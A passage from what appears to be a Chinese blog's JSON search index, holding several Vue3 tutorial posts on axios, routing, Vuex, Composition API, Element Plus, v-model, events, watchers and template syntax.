})\n}).then(res =>{\n    console.log(res.data);\n})\n```\n\n\n\n### 快捷方案\n\n#### get请求\n\n```js\naxios.get(\"http://iwenwiki.com/api/blueberrypai/getChengpinDetails.php\")\n    .then(res =>{\n      console.log(res.data);\n    })\n```\n\n\n\n#### post请求\n\n```js\naxios.post(\"http://iwenwiki.com/api/blueberrypai/login.php\", qs.stringify({\n      user_id: \"iwen@qq.com\",\n      password: \"iwen123\",\n      verification_code: \"crfvw\"\n    }))\n      .then(res => {\n        console.log(res.data);\n      })\n```\n\n\n\n\n\n\n\n\n\n\n\n## Axios网络请求封装\n\n\n\n\n\n\n\n在日常应用过程中，一个项目中的网络请求会很多，此时一般采取的方案是将网络请求封装起来\n\n\n\n在`src`目录下创建文件夹`utils`，并创建文件`request`，用来存储网络请求对象 `axios`\n\n```js\nimport axios from \"axios\"\nimport qs from \"querystring\"\n\n\nconst errorHandle = (status,info) => {\n    switch(status){\n        case 400:\n            console.log(\"语义有误\");\n            break;\n        case 401:\n            console.log(\"服务器认证失败\");\n            break;\n        case 403:\n            console.log(\"服务器拒绝访问\");\n            break;\n        case 404:\n            console.log(\"地址错误\");\n            break;\n        case 500:\n            console.log(\"服务器遇到意外\");\n            break;\n        case 502:\n            console.log(\"服务器无响应\");\n            break;\n        default:\n            console.log(info);\n            break;\n    }\n}\n\n\nconst instance = axios.create({\n    timeout:5000\n})\n\ninstance.interceptors.request.use(\n    config =>{\n        if(config.method === \"post\"){\n            config.data = qs.stringify(config.data)\n        }\n        return config;\n    },\n    error => Promise.reject(error)\n)\n\ninstance.interceptors.response.use(\n    response => response.status === 200 ? Promise.resolve(response) : Promise.reject(response),\n    error =>{\n        const { response } = error;\n        errorHandle(response.status,response.info)\n    }\n)\n\nexport default instance;\n```\n\n\n\n在`src`目录下创建文件夹`api`，并创建文件`index`和`path`分别用来存放网络请求方法和请求路径\n\n```js\n// path.js\nconst base = {\n    baseUrl:\"http://iwenwiki.com\",\n    chengpin:\"/api/blueberrypai/getChengpinDetails.php\"\n}\n\nexport default base\n```\n\n```js\n// index.js\nimport path from \"./path\"\nimport axios from \"../utils/request\"\n\nexport default {\n    getChengpin(){\n        return axios.get(path.baseUrl + path.chengpin)\n    }\n}\n```\n\n\n\n在组件中直接调用网络请求\n\n```js\nimport api from \"../api/index\"\n\napi.getChengpin().then(res =>{\n    console.log(res.data);\n})\n```\n\n\n\n\n\n\n\n\n\n## 网络请求跨域解决方案\n\n\n\n\n\n\n\nJS采取的是同源策略\n\n同源策略是浏览器的一项安全策略，浏览器只允许js 代码请求和当前所在服务器域名,端口,协议相同的数据接口上的数据,这就是同源策略.\n\n也就是说，当协议、域名、端口任意一个不相同时，都会产生跨域问题，所以又应该如何解决跨域问题呢\n\n\n\n### 跨域错误提示信息\n\n\n\n\n\n### 目前主流的跨域解决方案有两种：\n\n1. 后台解决：cors\n2. 前台解决：proxy\n\n```js\ndevServer: {\n    proxy: {\n      '/api': {\n        target: '<url>',\n        changeOrigin: true\n      }\n    }\n}\n```\n\n> **温馨提示**\n>\n> 解决完跨域配置之后，要记得重启服务器才行哦！\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Vue引入路由配置\n\n\n\n\n\n\n\n在Vue中，我们可以通过`vue-router`路由管理页面之间的关系\n\nVue Router 是 Vue.js 的官方路由。它与 Vue.js 核心深度集成，让用 Vue.js 构建单页应用变得轻而易举\n\n\n\n### 在Vue中引入路由\n\n第一步：安装路由 `npm install --save vue-router`\n\n第二步：配置独立的路由文件\n\n```js\n// index.js\nimport { createRouter, createWebHashHistory } from 'vue-router'\nimport HomeView from '../views/HomeView.vue'\n\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: HomeView\n  },\n  {\n    path: '/about',\n    name: 'about',\n    component: () => import('../views/AboutView.vue')\n  }\n]\n\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes\n})\n\nexport default router\n```\n\n第三步：引入路由到项目\n\n```js\n// main.js\nimport router from './router'\napp.use(router)\n```\n\n第四步：指定路由显示入口 `<router-view/>`\n\n第五步：指定路由跳转\n\n```vue\n<router-link to=\"/\">Home</router-link> |\n<router-link to=\"/about\">About</router-link>\n```\n\n\n\n\n\n\n\n\n\n## 路由传递参数\n\n\n\n\n\n\n\n页面跳转过程中，是可以携带参数的，这也是很常见的业务\n\n例如：在一个列表项，点击进入查看每个列表项的详情\n\n\n\n第一步：在路由配置中指定参数的`key`\n\n```js\n{\n    path:\"/list/:name\",\n    name:\"list\",\n    component:() => import(\"../views/ListView.vue\")\n}\n```\n\n第二步：在跳转过程中携带参数\n\n```vue\n<li><router-link to=\"/list/内蒙\">内蒙旅游十大景区</router-link></li>\n<li><router-link to=\"/list/北京\">北京旅游十大景区</router-link></li>\n<li><router-link to=\"/list/四川\">四川旅游十大景区</router-link></li>\n```\n\n第三步：在详情页面读取路由携带的参数\n\n```vue\n<p>{{ $route.params.name }}城市旅游景区详情</p>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n## 嵌套路由配置\n\n\n\n\n\n\n\n路由嵌套是非常常见的需求\n\n第一步：创建子路由要加载显示的页面\n\n第二步：在路由配置文件中添加子路由配置\n\n```js\n{\n    path:\"/news\",\n    name:\"news\",\n    redirect:\"/news/baidu\",\n    component:() => import(\"../views/NewsView.vue\"),\n    children:[\n       {\n       \t\tpath:\"baidu\",\n            component:() => import(\"../views/NewsList/BaiduNews.vue\"),\n       },\n       {\n            path:\"wangyi\",\n            component:() => import(\"../views/NewsList/WangyiNews.vue\"),\n       }\n    ]\n}\n```\n\n第三步：指定子路由显示位置`<router-view></router-view>`\n\n第四步：添加子路由跳转链接\n\n```vue\n<router-link to=\"/news/baidu\">百度新闻</router-link> | \n<router-link to=\"/news/wangyi\">网易新闻</router-link>\n```\n\n第五步：重定向配置 `redirect:\"/news/baidu\"`\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Vue状态管理(Vuex)\n\n\n\n\n\n\n\nVuex 是一个专为 Vue.js 应用程序开发的**状态管理模式 + 库**。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。\n\n简单来说，状态管理可以理解成为了更方便的管理组件之间的数据交互，提供了一个集中式的管理方案，任何组件都可以按照指定的方式进行读取和改变数据\n\n\n\n<img src=\"imgs/image-20220530160524287.png\" alt=\"image-20220530160524287\" style=\"zoom:50%;\" />\n\n\n\n### 引入Vuex的步骤\n\n第一步：安装Vuex `npm install --save vuex`\n\n第二步：配置Vuex文件\t\n\n```js\nimport { createStore } from 'vuex'\n\nexport default createStore({\n  state: {\n      counter:0\n  }\n})\n```\n\n第三步：在主文件中引入Vuex\n\n```js\nimport store from './store'\napp.use(store)\n```\n\n第四步：在组件中读取状态\n\n```vue\n<p>counter:{{ $store.state.counter }}</p>\n// 或者\nimport { mapState } from 'vuex';\ncomputed:{\n    ...mapState([\"counter\"])\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n## Vue状态管理核心(Vuex)\n\n\n\n\n\n\n\n最常用的核心概念包含: `State`、`Getter`、`Mutation`、`Action`\n\n\n\n### Getter\n\n对Vuex中的数据进行过滤\n\n```js\nimport { createStore } from 'vuex'\n\nexport default createStore({\n  state: {\n    counter: 0\n  },\n  getters: {\n    getCount(state){\n      return state.counter > 0 ? state.counter : \"counter小于0，不符合要求\"\n    }\n  }\n})\n```\n\n```js\nimport { mapState,mapGetters } from 'vuex';\ncomputed:{\n    ...mapGetters([\"getCount\"])\n}\n```\n\n\n\n\n\n### Mutation\n\n更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的事件类型 (type)和一个回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数\n\n```js\nimport { createStore } from 'vuex'\n\nexport default createStore({\n  state: {\n    counter: 0\n  },\n  getters: {\n  },\n  mutations: {\n    setCounter(state, num) {\n      state.counter += num\n    }\n  }\n})\n```\n\n```js\nimport { mapState,mapMutations } from 'vuex';\n\nmethods:{\n    ...mapMutations([\"setCounter\"]),\n    clickHandler(){\n      // this.$store.commit(\"setCounter\",20)\n\t  // 或者\n      // this.setCounter(10)\n    }\n}\n```\n\n\n\n### Action\n\nAction 类似于 mutation，不同在于：\n\n- Action 提交的是 mutation，而不是直接变更状态\n- Action 可以包含任意异步操作\n\n```js\nimport { createStore } from 'vuex'\nimport axios from \"axios\"\n\nexport default createStore({\n  state: {\n    counter: 0\n  },\n  getters: {\n    getCount(state){\n      return state.counter > 0 ? state.counter : \"counter小于0，不符合要求\"\n    }\n  },\n  mutations: {\n    setCounter(state, num) {\n      state.counter += num\n    }\n  },\n  actions: {\n    asyncSetCount({ commit }){\n      axios.get(\"http://iwenwiki.com/api/generator/list.php\")\n      .then(res =>{\n        commit(\"setCounter\",res.data[0])\n      })\n    }\n  }\n})\n\n```\n\n```js\nimport { mapState,mapMutations,mapGetters,mapActions } from 'vuex';\n\nmethods:{\n    ...mapActions([\"asyncSetCount\"]),\n    clickAsyncHandler(){\n        // this.$store.dispatch(\"asyncSetCount\")\n        // 或者\n        // this.asyncSetCount()\n    }\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n## Vue3新特性1\n\n\n\n\n\n\n\nVue3是目前Vue的最新版本，自然也是新增了很多新特性\n\n\n\n### 六大亮点\n\n- Performance：性能更比Vue 2.0强。\n- Tree shaking support：可以将无用模块“剪辑”，仅打包需要的。\n- **Composition API：组合API**\n- Fragment, Teleport, Suspense：“碎片”，Teleport即Protal传送门，“悬念”\n- Better TypeScript support：更优秀的Ts支持\n- Custom Renderer API：暴露了自定义渲染API\n\n\n\n### ref或者reactive\n\n在2.x中通过组件data的方法来定义一些当前组件的数据\n\n```js\ndata() {\n  return {\n    name: 'iwen',\n    list: [],\n  }\n}\n```\n\n在3.x中通过ref或者reactive创建响应式对象\n\n```js\nimport { ref,reactive } from \"vue\"\nexport default {\n  name: 'HelloWorld',\n  setup(){\n      const name = ref(\"iwen\")\n      const state = reactive({\n          list:[]\n      })\n\n    return{\n        name,\n        state\n    }\n  }\n}\n```\n\n\n\n### methods中定义的方法写在setup()\n\n在2.x中methods来定义一些当前组件内部方法\n\n```js\nmethods:{\n    http(){}\n}\n```\n\n在3.x中直接在setup方法中定义并return\n\n```js\nsetup() {\n    const http = ()=>{\n        // do something\n    }\n    return {\n      http\n    };\n}\n```\n\n\n\n### setup()中使用props和context\n\n在2.x中，组件的方法中可以通过this获取到当前组件的实例，并执行data变量的修改，方法的调用，组件的通信等等，但是在3.x中，setup()在beforeCreate和created时机就已调用，无法使用和2.x一样的this，但是可以通过接收setup(props,ctx)的方法，获取到当前组件的实例和props\n\n```js\nexport default {\n  props: {\n    name: String,\n  },\n  setup(props,ctx) {\n    console.log(props.name)\n    ctx.emit('event')\n  },\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Vue3新特性2\n\n\n\n\n\n\n\n### 在setup中使生命周期函\n\n你可以通过在生命周期钩子前面加上 “on” 来访问组件的生命周期钩子。\n\n下表包含如何在 setup () 内部调用生命周期钩子\n\n| Options API   | Hook inside setup |\n| ------------- | ----------------- |\n| beforeCreate  | Not needed*       |\n| created       | Not needed*       |\n| beforeMount   | onBeforeMount     |\n| mounted       | onMounted         |\n| beforeUpdate  | onBeforeUpdate    |\n| updated       | onUpdated         |\n| beforeUnmount | onBeforeUnmount   |\n| unmounted     | onUnmounted       |\n\n```js\nexport default {\n  setup() {\n    // mounted\n    onMounted(() => {\n      console.log('Component is mounted!')\n    })\n  }\n}\n```\n\n\n\n### Provide / Inject\n\n- provide() 和 inject() 可以实现嵌套组件之间的数据传递。\n- 这两个函数只能在 setup() 函数中使用。\n- 父级组件中使用 provide() 函数向下传递数据。\n- 子级组件中使用 inject() 获取上层传递过来的数据。\n- 不限层级 \n\n```js\n// 父组件\nimport { provide } from \"vue\"\n\nsetup() {\n    provide(\"customVal\", \"我是父组件向子组件传递的值\");\n}\n```\n\n```js\n// 子组件\nimport { inject } from \"vue\"\n\nsetup() {\n    const customVal = inject(\"customVal\");\n    return {\n      customVal\n    }\n}\n```\n\n\n\n### Fragment\n\nFragment翻译为：“碎片”\n\n- 不再限于模板中的单个根节点\n\n```vue\n<template>\n  <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n  <HelloWorld msg=\"Welcome to Your Vue.js App\" />\n</template>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Vue3加载Element-plus\n\n\n\n\n\n\n\nElement，一套为开发者、设计师和产品经理准备的基于 `Vue 2.0` 的桌面端组件库\n\nElement Plus 基于 `Vue 3`，面向设计师和开发者的组件库\n\n\n\n### 安装Element-Plus\n\n```js\nnpm install element-plus --save\n```\n\n\n\n### 完整引用\n\n如果你对打包后的文件大小不是很在乎，那么使用完整导入会更方便\n\n```js\nimport { createApp } from 'vue'\nimport ElementPlus from 'element-plus'\nimport 'element-plus/dist/index.css'\nimport App from './App.vue'\n\nconst app = createApp(App)\n\napp.use(ElementPlus)\napp.mount('#app')\n```\n\n\n\n### 按需导入\n\n按需导入才是我们的最爱，毕竟在真实的应用场景中并不是每个组件都会用到，这会造成不小的浪费\n\n首先你需要安装`unplugin-vue-components` 和 `unplugin-auto-import`这两款插件\n\n```js\nnpm install -D unplugin-vue-components unplugin-auto-import\n```\n\n\n\n然后修改`vue.config.js`配置文件\n\n```js\nconst { defineConfig } = require('@vue/cli-service')\nconst AutoImport = require('unplugin-auto-import/webpack')\nconst Components = require('unplugin-vue-components/webpack')\nconst { ElementPlusResolver } = require('unplugin-vue-components/resolvers')\n\nmodule.exports = defineConfig({\n  transpileDependencies: true,\n  configureWebpack: {\n    plugins: [\n      AutoImport({\n        resolvers: [ElementPlusResolver()]\n      }),\n      Components({\n        resolvers: [ElementPlusResolver()]\n      })\n    ]\n  }\n})\n```\n\n\n\n最后，可以直接在组件中使用\n\n```html\n<template>\n\t<el-button>Default</el-button>\n\t<el-button type=\"primary\">Primary</el-button>\n</template>\n```\n\n\n\n**实时效果反馈**\n\n**1. 在Vue3项目中引入饿了么UI组件库，下来命令正确的是：**\n\n<font style=\"background-color:rgb(233, 30, 100)\">A</font>   `npm install --save element-iu`\n\n<font style=\"background-color:rgb(255, 197, 10)\">B</font>   `vue add element`\n\n<font style=\"background-color:#8bc34a\">C</font>   `npm install element-plus --save`\n\n<font style=\"background-color:rgb(2, 170, 244);\">D</font>   `vue add element-plus`\n\n\n\n**答案**\n\n1=>C\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Vue3加载Element-plus的字体图标\n\n\n\n\n\n\n\n`Element-plus`不仅仅是提供了各种组件，同时还提供了一整套的字体图标方便开发者使用\n\n\n\n### 安装`icons`字体图标\n\n```js\nnpm install @element-plus/icons-vue\n```\n\n\n\n### 全局注册\n\n在项目根目录下，创建`plugins`文件夹，在文件夹下创建文件`icons.js`文件\n\n```js\nimport * as components from \"@element-plus/icons-vue\";\nexport default {\n    install: (app) => {\n        for (const key in components) {\n            const componentConfig = components[key];\n            app.component(componentConfig.name, componentConfig);\n        }\n    },\n};\n```\n\n\n\n### 引入文件\n\n在`main.js`中引入`icons.js`文件\n\n```js\nimport elementIcon from \"./plugins/icons\";\napp.use(elementIcon)\n```\n\n\n\n### 使用方式\n\n接下来就可以直接在组件中引入使用了\n\n```html\n<el-icon class=\"expand\" color=\"#409EFC\" :size=\"30\">\n    <expand />\n</el-icon>\n```\n\n","tags":["Vue3"],"categories":["前端","Vue3"]},{"title":"表单输入绑定（v-model）","url":"/20250619/9ee367a5.html","content":"\n# 表单输入绑定`v-model` \n\n你可以用 `v-model` 指令在表单 `<input>`、`<textarea>` 及 `<select>` 元素上创建双向数据绑定。\n\n它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 `v-model` 本质上不过是语法糖。\n\n它负责监听用户的输入事件来更新数据，并在某种极端场景下进行一些特殊处理。\n\n```html\n<input v-model=\"message\" placeholder=\"edit me\" />\n<p>Message is: {{ message }}</p>\n```\n\n```js\ndata() {\n    return {\n        message:\"\"\n    }\n}\n```\n\n> `v-model` 会忽略任何表单元素上初始的 `value`、`checked` 或 `selected` attribute。它将始终将当前绑定的 JavaScript 状态视为数据的正确来源。你应该在 JavaScript 中使用[`data`](https://cn.vuejs.org/api/options-state.html#data) 选项来声明该初始值。\n\n# 基本用法\n\n\n\n## 文本\n\n\n\n\n\n# 修饰符\n\n## `.lazy`\n\n在默认情况下，`v-model` 在每次 `input` 事件触发后将输入框的值与数据进行同步 。你可以添加 `lazy` 修饰符，从而转为在 `change` 事件之后进行同步\n\n```html\n<input v-model.lazy=\"message\" />\n<p>Message is: {{ message }}</p>\n```\n\n```js\ndata() {\n    return {\n        message:\"\"\n    }\n}\n```\n\n## `.trim`\n\n如果要自动过滤用户输入的首尾空白字符，可以给 `v-model` 添加 `trim` 修饰符\n\n```html\n<input v-model.trim=\"message\" />\n```\n\n```js\ndata() {\n    return {\n        message:\"\"\n    }\n}\n```\n\n## `.number`\n\n如果你想让用户输入自动转换为数字，你可以在 `v-model` 后添加 `.number` 修饰符来管理输入：如果该值无法被 `parseFloat()` 处理，那么将返回原始值。\n\n`number` 修饰符会在输入框有 `type=\"number\"` 时自动启用。\n\n```html\n<input v-model.number=\"age\" />\n```\n\n","tags":["Vue3"],"categories":["前端","Vue3"]},{"title":"事件处理","url":"/20250619/4446b2a4.html","content":"\n\n\n# `v-on` 或者`@`：监听DOM事件\n\n我们可以使用 `v-on` 指令 (通常缩写为 `@` 符号) 来监听 DOM 事件，并在触发事件时执行一些 JavaScript。\n\n用法为 `v-on:click=\"methodName\"` 或使用快捷方式 `@click=\"methodName\"`\n\n```html\n<button @click=\"counter += 1\">Add 1</button>\n```\n\n```js\nexport default{\n    data() {\n        return {\n                counter: 0\n            }\n        }\n}\n```\n\n  \n\n# 事件参数\n\n事件参数可以获取`event`对象和通过事件传递数据\n\n官方的翻译称呼：内联处理器中的方法\n\n```html\n<button @click=\"say('hi')\">Say hi</button>\n<button @click=\"greet\">Say what</button>\n\n<p @click=getNameHandler(item, $event) v-for=\"(item, index) of names\" :key=\"index\">{{item}}</p>\n```\n\n```js\nexport default {\n    data() {\n        return {\n            counter: 0,\n            names : [\"赵\",\"钱\",\"孙\",\"李\"]\n        }\n    },\n    methods: {\n        say(message) {\n            // message传参\n            alert(message)\n        },\n        greet(e) {\n            // event 是原生 DOM event. \n            if (e) {\n                alert(e.target.tagName)\n                // 读取data里面的数据方案：this.count\n                this.count++\n                alert(this.count)\n            }\n        },\n        getNameHandler(name, e){\n            // 传参和event同时传递的时候，使用$event传递event\n            console.log(name);\n            console.log(e)\n        }\n    }\n}\n```\n\n \n\n##  `.` 事件修饰符\n\n\n\nVue.js 为 v-on 提供了事件修饰符来处理 DOM 事件细节，如：event.preventDefault() 或 event.stopPropagation()。\n\nVue.js 通过由点 `.` 表示的指令后缀来调用修饰符。\n\n- `.stop` - 阻止冒泡\n- `.prevent` - 阻止默认事件\n- `.capture` - 阻止捕获\n- `.self` - 只监听触发该元素的事件\n- `.once` - 只触发一次\n- `.left` - 左键事件\n- `.right` - 右键事件\n- `.middle` - 中间滚轮事件\n\n```\n<!-- 阻止单击事件冒泡 -->\n<a v-on:click.stop=\"doThis\"></a>\n<!-- 提交事件不再重载页面 -->\n<form v-on:submit.prevent=\"onSubmit\"></form>\n<!-- 修饰符可以串联  -->\n<a v-on:click.stop.prevent=\"doThat\"></a>\n<!-- 只有修饰符 -->\n<form v-on:submit.prevent></form>\n\n<!-- 添加事件侦听器时使用事件捕获模式 -->\n<div v-on:click.capture=\"doThis\">...</div>\n\n<!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 -->\n<div v-on:click.self=\"doThat\">...</div>\n\n<!-- click 事件只能点击一次，2.1.4版本新增 -->\n<a v-on:click.once=\"doThis\"></a>\n```\n\n## `：`按键修饰符\n\nVue 允许为 v-on 在监听键盘事件时添加按键修饰符`：`\n\n```\n<!-- 只有在 keyCode 是 13 时调用 vm.submit() -->\n<input v-on:keyup.13=\"submit\">\n```\n\n记住所有的 keyCode 比较困难，所以 Vue 为最常用的按键提供了别名：\n\n```\n<!-- 同上 -->\n<input v-on:keyup.enter=\"submit\">\n<!-- 缩写语法 -->\n<input @keyup.enter=\"submit\">\n```\n\n全部的按键别名：\n\n- `.enter`\n- `.tab`\n- `.delete` (捕获 \"删除\" 和 \"退格\" 键)\n- `.esc`\n- `.space`\n- `.up`\n- `.down`\n- `.left`\n- `.right`\n- `.ctrl`\n- `.alt`\n- `.shift`\n- `.meta`\n\n","tags":["Vue3"],"categories":["前端","Vue3"]},{"title":"侦听器（watch）","url":"/20250619/1954b1ff.html","content":"\n\n\nhttps://cn.vuejs.org/guide/essentials/watchers.html\n\n侦听对象为data中定义的响应式数据+组件数据\n\n计算属性允许我们声明性地计算衍生值。\n\n然而在有些情况下，我们需要在状态变化时执行一些“其他操作”：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态。\n\n# 基本示例\n\n在选项式 API 中，我们可以使用 [`watch` 选项](https://cn.vuejs.org/api/options-state.html#watch)在每次响应式属性发生变化时触发一个函数。\n\n```js\nexport default {\n    data() {\n        return {\n            question: '',\n            answer: 'Questions usually contain a question mark. ;-)'\n        }\n    },\n    methods: {\n        async getAnswer() {\n            this.answer = 'Thinking...'\n            try {\n                const res = await fetch('https://yesno.wtf/api')\n                this.answer = (await res.json()).answer\n            } catch (error) {\n                this.answer = 'Error! Could not reach the API. ' + error\n            }\n        }\n    },\n    watch: {\n        // 每当 question 改变时，这个函数就会执行，从而回去对应的answer\n        question(newQuestion, oldQuestion) {\n            if (newQuestion.includes('?')) {\n                this.getAnswer()\n            }\n        }\n    },\n}\n```\n\n\n\n>`watch`中定义的函数名称必须和`侦听的数据对象`一致。\n\n\n\n# 深层侦听器\n\n\n\n```js\nexport default {\n  watch: {\n    // 注意：只能是简单的路径，不支持表达式。\n    'some.nested.key'(newValue) {\n      // ...\n    }\n  }\n}\n```\n\n```js\nexport default {\n  watch: {\n    someObject: {\n      handler(newValue, oldValue) {\n        // 注意：在嵌套的变更中，\n        // 只要没有替换对象本身，\n        // 那么这里的 `newValue` 和 `oldValue` 相同\n      },\n      deep: true\n    }\n  }\n}\n```\n\n\n\n# [即时回调的侦听器](https://cn.vuejs.org/guide/essentials/watchers.html#eager-watchers)\n\n`watch` 默认是懒执行的：仅当数据源变化时，才会执行回调。但在某些场景中，我们希望在创建侦听器时，立即执行一遍回调。\n\n举例来说，我们想请求一些初始数据，然后在相关状态更改时重新请求数据。\n\n我们可以用一个对象来声明侦听器，这个对象有 `handler` 方法和 `immediate: true` 选项，这样便能强制回调函数立即执行：\n\n```js\nexport default {\n  // ...\n  watch: {\n    question: {\n      handler(newQuestion) {\n        // 在组件实例创建时会立即调用\n      },\n      // 强制立即执行回调\n      immediate: true\n    }\n  }\n  // ...\n}\n```\n\n回调函数的初次执行就发生在 `created` 钩子之前。Vue 此时已经处理了 `data`、`computed` 和 `methods` 选项，所以这些属性在第一次调用时就是可用的。\n\n# [回调的触发时机](https://cn.vuejs.org/guide/essentials/watchers.html#callback-flush-timing)\n\n当你更改了响应式状态，它可能会同时触发 Vue 组件更新和侦听器回调。\n\n默认情况下，用户创建的侦听器回调，都会在 Vue 组件更新**之前**被调用。这意味着你在侦听器回调中访问的 DOM 将是被 Vue 更新之前的状态。\n\n如果想在侦听器回调中能访问被 Vue 更新**之后**的 DOM，你需要指明 `flush: 'post'` 选项：\n\n```js\nexport default {\n  // ...\n  watch: {\n    key: {\n      handler() {},\n      flush: 'post'\n    }\n  }\n}\n```\n\n# `created`：  [this.$watch()](https://cn.vuejs.org/guide/essentials/watchers.html#this-watch)\n\n我们也可以使用组件实例的 [`$watch()` 方法](https://cn.vuejs.org/api/component-instance.html#watch)来命令式地创建一个侦听器：\n\n```js\nexport default {\n  created() {\n    this.$watch('question', (newQuestion) => {\n      // ...\n    })\n  }\n}\n```\n\n如果要在特定条件下设置一个侦听器，或者只侦听响应用户交互的内容，这方法很有用。它还允许你提前停止该侦听器。\n\n# [停止侦听器](https://cn.vuejs.org/guide/essentials/watchers.html#stopping-a-watcher)\n\n用 `watch` 选项或者 `$watch()` 实例方法声明的侦听器，会在宿主组件卸载时自动停止。因此，在大多数场景下，你无需关心怎么停止它。\n\n在少数情况下，你的确需要在组件卸载之前就停止一个侦听器，这时可以调用 `$watch()` API 返回的函数：\n\n```js\nconst unwatch = this.$watch('foo', callback)\n\n// ...当该侦听器不再需要时\nunwatch()\n```\n\n \n\n# 数组变化的侦测\n\n## 变更方法：原数组发生变化，UI自动更新\n\n- `push()`\n- `pop()`\n- `shift()`\n- `unshift()`\n- `splice()`\n- `sort()`\n- `reverse()`\n\n## 替换一个数组：原数组不发生变化，UI无法自动更新\n\n- `fliter()`\n- `concat()`\n- `slice()`\n\n","tags":["Vue3"],"categories":["前端","Vue3"]},{"title":"Vue3基础","url":"/20250619/7d2d5550.html","content":"\n\n\n## 模板语法\n\n### `{{ msg }}`:文本\n\n数据绑定最常见的形式就是使用“Mustache” (双大括号) 语法的文本插值\n\n```html\n<span>Message: {{ msg }}</span>\n```\n\n一般配合`js` 中的`data()`设置数据\n\n```js\nexport default {\n  name: 'HelloWorld',\n  data(){\n    return{\n      msg:\"消息提示\"\n    }\n  }\n}\n```\n\n\n\n### `v-html`：原始 HTML\n\n双大括号会将数据解释为普通文本，而非 HTML 代码。为了输出真正的 HTML，你需要使用`v-html` 指令\n\n```html\n<p>Using mustaches: {{ rawHtml }}</p>\n<p>Using v-html directive: <span v-html=\"rawHtml\"></span></p>\n```\n\n```js\ndata(){\n    return{\n        rawHtml:\"<a href='https://www.itbaizhan.com'>百战</a>\"\n    }\n}\n```\n\n\n\n### `v-bind`  ：设置属性\n\nMustache 语法不能在 HTML 属性中使用，然而，可以使用 `v-bind` 指令\n\n```html\n<div v-bind:id=\"dynamicId\"></div>\n```\n\n```js\ndata(){\n    return{\n        dynamicId:1001\n    }\n}\n```\n\n> **温馨提示**\n>\n> `v-bind:` 可以简写成 `:`\n\n\n\n### 使用 JavaScript 表达式\n\n在我们的模板中，我们一直都只绑定简单的 property 键值，Vue.js 都提供了完全的 JavaScript 表达式支持\n\n```js\n{{ number + 1 }}\n\n{{ ok ? 'YES' : 'NO' }}\n\n{{ message.split('').reverse().join('') }}\n```\n\n这些表达式会在当前活动实例的数据作用域下作为 JavaScript 被解析。有个限制就是，每个绑定都只能包含**单个表达式**，所以下面的例子都**不会**生效。\n\n```js\n<!--  这是语句，不是表达式：-->\n{{ var a = 1 }}\n\n<!-- 流程控制也不会生效，请使用三元表达式 -->\n{{ if (ok) { return message } }}\n```\n\n## 条件渲染\n\n### v-if\n\n`v-if` 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 `true` 值的时候被渲染。\n\n```html\n<p v-if=\"flag\">我是孙猴子</p>\n```\n\n```js\ndata() {\n    return {\n        flag: true\n    }\n}\n```\n\n### v-else\n\n你可以使用 `v-else` 指令来表示 `v-if` 的“else 块”\n\n```html\n<p v-if=\"flag\">我是孙猴子</p>\n<p v-else>你是傻猴子</p>\n```\n\n```js\ndata() {\n    return {\n        flag: false\n    }\n}\n```\n\n\n\n### v-show\n\n另一个用于条件性展示元素的选项是 `v-show` 指令\n\n```html\n<h1 v-show=\"ok\">Hello!</h1>\n```\n\n\n\n### `v-if` 和`v-show` 的区别\n\n`v-if` 是“真正”的条件渲染，因为它会确保在切换过程中，条件块内的事件监听器和子组件适当地被销毁和重建。\n\n`v-if` 也是**惰性的**：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。\n\n相比之下，`v-show` 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。\n\n一般来说，`v-if` 有更高的切换开销，而 `v-show` 有更高的初始渲染开销。\n\n因此，如果需要非常频繁地切换，则使用 `v-show` 较好；如果在运行时条件很少改变，则使用 `v-if` 较好\n\n\n\n## 列表渲染\n\n###  `v-for` ：把一个数组映射为一组元素\n\n我们可以用 `v-for` 指令基于一个数组来渲染一个列表。\n\n`v-for` 指令需要使用 `item in items` 形式的特殊语法，其中 items 是源数据数组，而 `item` 则是被迭代的数组元素的**别名**。\n\n```html\n<ul>\n    <li v-for=\"item in items\">{{ item.message }}</li>\n</ul>\n```\n\n```js\ndata() {\n    return {\n        items: [{ message: 'Foo' }, { message: 'Bar' }]\n    }\n}\n```\n\n\n\n###  为`v-for` 提供一个 `key` attribute\n\n当 Vue 正在更新使用 `v-for` 渲染的元素列表时，它默认使用`“就地更新”`的策略。\n\n如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序，而是就地更新每个元素，并且确保它们在每个索引位置正确渲染。\n\n为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一的 `key` attribute：\n\n```html\n<div v-for=\"(item,index) in items\" :key=\"item.id|index\">\n  <!-- 内容 -->\n    <span>{{ item.title }}</span>\n    <img :src=\"item.avator\" alt=\"\">\n</div>\n```\n\n> 温馨提示\n>\n> `key`时通过`v-bind`绑定的属性\n>\n> 建议所有可行的时候，均给 `v-for` 提供一个 `key` attribute\n>\n>  `key` 绑定的值期望是一个基础类型的值，例如字符串或number类型\n\n## `computed`：计算属性\n\nhttps://cn.vuejs.org/guide/essentials/computed.html#writable-computed\n\n为避免在模板中使用复杂的表达式，推荐使用**计算属性**来描述依赖响应式状态的复杂逻辑\n\n计算属性默认是只读的。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 